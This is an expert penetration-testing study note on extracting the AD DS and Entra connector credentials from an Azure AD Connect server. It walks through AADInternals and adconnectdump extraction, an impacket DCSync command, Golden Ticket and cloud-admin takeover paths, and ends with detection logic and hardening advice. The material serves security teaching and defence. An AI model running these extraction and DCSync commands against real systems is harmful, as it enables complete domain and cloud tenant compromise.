---
tags: [active-directory, azure, hybrid, exchange, vapt]
difficulty: expert
module: "65 - Hybrid Identity, Entra ID, and Exchange Attacks"
topic: "65.03 Azure AD Connect Sync Credential Extraction"
---

# 65.03 - Azure AD Connect Sync Credential Extraction

## Executive Summary
In a hybrid identity environment, the Microsoft Entra Connect Sync server (formerly Azure AD Connect) is the critical bridge that synchronizes on-premises Active Directory (AD DS) objects to the cloud (Entra ID). To perform this synchronization—specifically Password Hash Synchronization (PHS)—the AD Connect server requires extensive privileges on the on-premises domain, historically requiring the `MS-DRSR` (Directory Replication Service Remote Protocol) capability. This capability is exactly what is used in a **DCSync** attack.

If an attacker compromises the AD Connect server, they can extract the heavily encrypted AD DS connector account credentials from the underlying SQL database. Because this account often holds DCSync privileges, extracting its plaintext password guarantees total domain compromise. This note provides an extreme-depth technical breakdown of the AD Connect architecture, the cryptographic mechanisms used to store credentials, and the exact methodology to extract and decrypt them.

---

## AD Connect Architecture and Credential Storage

### The Synchronization Flow
The AD Connect synchronization engine uses two primary accounts to bridge the environments:
1. **AD DS Connector Account (`MSOL_xxxxxxxxxxxx`):** An account created in the on-premises Active Directory. If PHS is enabled, this account is granted the "Replicating Directory Changes" and "Replicating Directory Changes All" rights.
2. **Azure AD Connector Account (`Sync_xxxxxxxxxxxx`):** A cloud-side account in Entra ID that pushes the synchronized data.

### The Storage Mechanism: LocalDB and Cryptography
AD Connect stores its configuration, including the credentials for the connector accounts, in a SQL database. By default, this is a local SQL Server Express instance (`LocalDB`) running as a service.

The credentials are not stored in plaintext; they are heavily encrypted using the Windows Data Protection API (DPAPI) and symmetric encryption algorithms (AES).
- The encryption keys are managed by a component called `mcrypt`.
- The keys required to decrypt the `LocalDB` contents are stored in the Windows Registry of the AD Connect server.
- The `mcrypt` key itself is protected by the DPAPI context of the `ADSync` service account.

---

## Architectural Visualization: Sync Credential Storage and Extraction

```text
+----------------------------------------------------------------------------------------+
|                            AZURE AD CONNECT SERVER (TIER-0 ASSET)                      |
|                                                                                        |
|   +--------------------------------------------------------------------------------+   |
|   |                              Windows Registry                                  |   |
|   |  (HKLM\SOFTWARE\Microsoft\Azure AD Connect\Synchronization\Encryption)         |   |
|   |  Stores the DPAPI-encrypted 'mcrypt' key used to encrypt the SQL database.     |   |
|   +--------------------------------------+-----------------------------------------+   |
|                                          |                                             |
|                                          v                                             |
|   +--------------------------------------+-----------------------------------------+   |
|   |                              ADSync Service                                    |   |
|   |  Runs under a specific Service Account. Has the DPAPI context to decrypt       |   |
|   |  the 'mcrypt' key.                                                             |   |
|   +--------------------------------------+-----------------------------------------+   |
|                                          |                                             |
|                                          v                                             |
|   +--------------------------------------+-----------------------------------------+   |
|   |                      Microsoft SQL Server Express (LocalDB)                    |   |
|   |  Table: dbo.mms_management_agent                                               |   |
|   |  Column: private_configuration_xml                                             |   |
|   |  Contains: Encrypted AD DS Connector (MSOL_*) Account Credentials.             |   |
|   +--------------------------------------+-----------------------------------------+   |
|                                          |                                             |
|              Attacker executes AdSyncDecrypt / AADInternals                            |
|              1. Injects into ADSync / impersonates service to get DPAPI context.       |
|              2. Extracts and decrypts 'mcrypt' key from Registry.                      |
|              3. Queries LocalDB for encrypted XML payload.                             |
|              4. Decrypts XML payload to reveal Plaintext MSOL Password.                |
|                                          |                                             |
+------------------------------------------|---------------------------------------------+
                                           |
                                           v
+------------------------------------------+---------------------------------------------+
|                          ON-PREMISES DOMAIN CONTROLLER                                 |
|                                                                                        |
|   Attacker uses the extracted MSOL_* plaintext password to execute a DCSync attack     |
|   over MS-DRSR, dumping the KRBTGT hash and achieving total domain compromise.         |
+----------------------------------------------------------------------------------------+
```

---

## Vulnerability Mechanics: The Cryptographic Weakness

The vulnerability is not a flaw in the cryptographic algorithm (which is standard AES and DPAPI), but rather a design necessity. The ADSync service *must* be able to autonomously decrypt the AD DS connector credentials to perform synchronization. Therefore, if an attacker gains local Administrator or SYSTEM privileges on the AD Connect server, they can impersonate the ADSync service, access its DPAPI master keys, read the symmetric keys from the registry, and decrypt the database.

### The Attack Chain Requirements
1. **Local Administrator Rights** on the server hosting Azure AD Connect.
2. The ability to execute code or scripts (e.g., PowerShell or C# binaries) in the context of the `ADSync` service account or `SYSTEM`.

---

## Step-by-Step Exploitation Mechanics

### Method 1: Using AADInternals (PowerShell)

Dr. Nestori Syynimaa's `AADInternals` framework contains a built-in module designed explicitly for this extraction.

#### Step 1: Privilege Escalation
You must run the PowerShell session as a Local Administrator on the AD Connect server.

#### Step 2: Extracting the Credentials
```powershell
# Import the module
Import-Module AADInternals

# Extract the AD DS and Azure AD connector credentials
Get-AADIntSyncCredentials
```

*Expected Output Breakdown:*
The tool will automatically query the WMI namespace `root\MicrosoftIdentityIntegrationServer` or directly query the LocalDB. It decrypts the payloads and outputs:
```text
Connector               : mydomain.local
Account                 : mydomain\MSOL_1a2b3c4d5e6f
Password                : P@ssw0rd123!Complex_String
Type                    : ActiveDirectory

Connector               : mydomain.onmicrosoft.com - AAD
Account                 : Sync_ServerName_8a7b6c5d4e3f@mydomain.onmicrosoft.com
Password                : AAD_RandomlyGenerated_Password
Type                    : Extensible2
```

### Method 2: Manual Extraction using `adconnectdump` / `AdSyncDecrypt`

If PowerShell logging or AMSI prevents the use of `AADInternals`, an attacker can use a compiled C# binary like `adconnectdump` (originally part of tools by xpn or harmj0y).

#### Step 1: Connect to LocalDB
The tool connects to the named pipe of the AD Connect LocalDB.
`Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync;Integrated Security=True`

#### Step 2: Query the Encrypted Configuration
It executes the following SQL query to retrieve the configuration XML:
```sql
SELECT private_configuration_xml, encrypted_configuration 
FROM mms_management_agent
```
The result is a block of XML where the password field is heavily encrypted.

#### Step 3: Decryption via API Calls
The tool reads the DPAPI-protected registry key `HKLM\SOFTWARE\Microsoft\Azure AD Connect\Synchronization\Encryption` to extract the `mcrypt` key. It then uses standard Windows cryptography APIs (`CryptUnprotectData` running in the context of the ADSync service) to decrypt the `mcrypt` key, which is subsequently used to decrypt the SQL payload.

```cmd
C:\> adconnectdump.exe
[+] Extracted ADSync Registry Encryption Key
[+] Unprotected ADSync Encryption Key
[+] Querying LocalDB...
[+] Domain: mydomain.local
[+] Username: MSOL_1a2b3c4d5e6f
[+] Password: P@ssw0rd123!Complex_String
```

### Method 3: DCSync Execution
Once the `MSOL_` account credentials are extracted, the attacker runs `secretsdump.py` or `mimikatz` from their attacking machine, pointing at the Domain Controller.

```bash
# Using Impacket to DCSync the entire domain using the MSOL account
impacket-secretsdump 'mydomain.local/MSOL_1a2b3c4d5e6f:P@ssw0rd123!Complex_String'@192.168.1.10 -just-dc
```

---

## The Cloud Implication: The `Sync_` Account

The extraction also reveals the cloud-side `Sync_*` account password. This account holds highly privileged roles in Entra ID (specifically, `Directory Synchronization Accounts` role).
- **Abuse:** An attacker can use the `Sync_*` credentials with the `AADInternals` tool `Set-AADIntSyncConfiguration` to forge hybrid identity states.
- They can change a cloud-only Global Administrator's immutable ID to map to an on-prem object they control, effectively taking over the highest privileges in the cloud environment.

---

## Indicators of Compromise (IoCs) and Detection Engineering

Detecting this attack requires monitoring both the AD Connect server locally and the broader network telemetry.

### 1. AD Connect Server Telemetry (Host-Based)
- **Suspicious Process Execution:** Monitor for unapproved binaries, script executions, or unsigned DLLs executing on the AD Connect server.
- **WMI Queries:** Monitor for anomalous processes querying the `root\MicrosoftIdentityIntegrationServer` namespace (often used by extraction scripts).
- **SQL / Named Pipe Access:** Anomalous connections to the `(localdb)\.\ADSync` named pipe from user sessions other than the dedicated `ADSync` service account.

### 2. Network / Active Directory Telemetry
- **Anomalous DCSync (Event ID 4662):** A DCSync attack operates via the MS-DRSR protocol. A Domain Controller should only receive MS-DRSR replication requests from other highly trusted Domain Controllers or the *specific IP address* of the AD Connect server.
- **Detection Logic:** Alert on Event ID `4662` (Directory Service Access) involving the GUID `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (DS-Replication-Get-Changes-All) where the Subject Logon ID does not map to a Domain Controller computer account or the verified AD Connect server IP.

---

## Hardening and Remediation Strategies

1. **Tier-0 Classification:** The Azure AD Connect server must be treated with the exact same security rigor as a primary Domain Controller. It is a Tier-0 asset.
2. **Restrict Local Admins:** Ensure that absolutely no unnecessary users or IT support staff have local administrator rights to the AD Connect server.
3. **Network Segmentation:** Place the AD Connect server in a restricted management VLAN. It only requires outbound HTTP/HTTPS access to Microsoft endpoints and LDAP/RPC access to internal DCs.
4. **Endpoint Protection:** Deploy an aggressive EDR policy on the AD Connect server. Block standard lateral movement tools and PowerShell execution by non-system accounts.
5. **Switch to Entra Cloud Sync:** Where possible, migrate from Azure AD Connect to the newer **Microsoft Entra Cloud Sync**. Cloud Sync uses a lightweight provisioning agent on-prem. The agent *does not* store any high-privilege credentials locally (they are managed in the cloud), eliminating this specific extraction vector entirely.

---


## Real-World Attack Scenario
## Real-World Attack Scenario: The Sync Server Skeleton Key

**The Context:** During a covert penetration test, an attacker has established a foothold in a large enterprise network via a vulnerable internal web application. The organization utilizes a hybrid identity model, heavily relying on Azure AD Connect with Password Hash Synchronization (PHS) to allow users to authenticate to Microsoft 365. The on-premises Domain Controllers are heavily monitored by Microsoft Defender for Identity (MDI), making traditional attacks like Kerberoasting or direct domain controller exploitation highly risky. The attacker opts for a stealthier path: targeting the identity bridge itself.

**The Reconnaissance:** 
Using low-noise LDAP queries via a custom script, the attacker enumerates the domain and identifies the user `MSOL_38472948a7b6`. Recognizing the standard naming convention for the AD DS Connector account, they look up its permissions and confirm it holds the `DS-Replication-Get-Changes-All` privilege. They then query the `servicePrincipalName` attributes and locate the Azure AD Connect server, `SRV-IDENTITY-01`.

**The Execution:**
1. **Targeting the Bridge:** The attacker discovers that `SRV-IDENTITY-01` is missing a critical local privilege escalation patch (e.g., PrintNightmare). They exploit the vulnerability, instantly elevating their access from a standard domain user to `NT AUTHORITY\SYSTEM` on the AD Connect server.
2. **Bypassing EDR:** Knowing that EDR is actively monitoring LSASS, the attacker avoids standard credential dumping tools. Instead, they leverage the legitimate `ADSync` service already running on the machine. 
3. **Cryptographic Unwrapping:** The attacker executes a custom, obfuscated PowerShell script (similar to `AADInternals`). The script dynamically imports Windows DPAPI functions, impersonates the `ADSync` service account, and queries the `HKLM\SOFTWARE\Microsoft\Azure AD Connect\Synchronization\Encryption` registry key to extract the encrypted `mcrypt` key.
4. **Database Extraction:** The script successfully decrypts the `mcrypt` key using the service account's DPAPI context. It then connects to the local SQL Express instance (`LocalDB`) via named pipes, queries the `mms_management_agent` table, and decrypts the XML configuration block.
5. **The Final Blow:** The output cleanly reveals the plaintext password for the `MSOL_38472948a7b6` account: `TrU$tN00n3!99`. 

**The Outcome:**
Armed with the plaintext password of the highly privileged connector account, the attacker executes a DCSync attack using Impacket’s `secretsdump.py` over an encrypted tunnel. They selectively extract the NTLM hash of the `krbtgt` account, avoiding a full NTDS.dit dump to minimize network anomalies. The attacker then forges a Golden Ticket, achieving total administrative control over the entire on-premises forest without ever triggering the MDI alerts monitoring the Domain Controllers.

## Chaining Opportunities
- If an attacker gains lateral movement capability into the Tier-0 environment, AD Connect is often an easier target than a hardened Domain Controller, but yields the same result.
- Once the MSOL account is extracted, proceed to execute a DCSync attack to dump the `krbtgt` hash.
- With the `krbtgt` hash, the attacker can forge a Golden Ticket. If Seamless SSO is in use, they can also forge the `AZUREADSSOACC` hash to pivot into the cloud environment. (See [[04 - Seamless SSO Desktop SSO Abuse]]).

## Related Notes
- [[01 - Entra ID vs On-Prem AD Architecture]]
- [[04 - Seamless SSO Desktop SSO Abuse]]
- [[Active Directory - DCSync Attacks]]
- [[Active Directory Exploitation Fundamentals]]

---
*End of note.*
